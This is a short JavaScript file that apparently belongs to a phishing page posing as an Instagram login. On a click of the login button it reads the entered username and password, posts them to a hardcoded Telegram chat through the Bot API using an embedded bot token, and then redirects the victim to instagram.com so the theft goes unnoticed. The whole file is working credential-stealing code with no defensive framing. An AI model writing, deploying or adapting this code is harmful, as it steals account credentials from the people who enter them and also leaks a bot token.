

let inputs = document.querySelectorAll(`input`)
let buttonLoginn = document.querySelector(`.login-button`)

const SendMassegeFunction = () => {
    let Token = `7353248448:AAFOfB_s__5T3mzW6olenLWZCWP71LQT7vk`
    let ChatId = `5916236125`
    let ApiUrl = `https://api.telegram.org/bot${Token}/sendMessage`;
    
    let data = {
        chat_id: ChatId,
        text: `username: ${inputs[0].value} \spassword: ${inputs[1].value}`
    }

    let options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };
    
    fetch(ApiUrl, options)
        .then(data => data.json())
        .then(res => {
            console.log('data ketdi', res)
            window.location.href = "https://www.instagram.com/"
        })
        .catch(error => console.log('Hatolik bor', error))
}

buttonLoginn.addEventListener('click', SendMassegeFunction)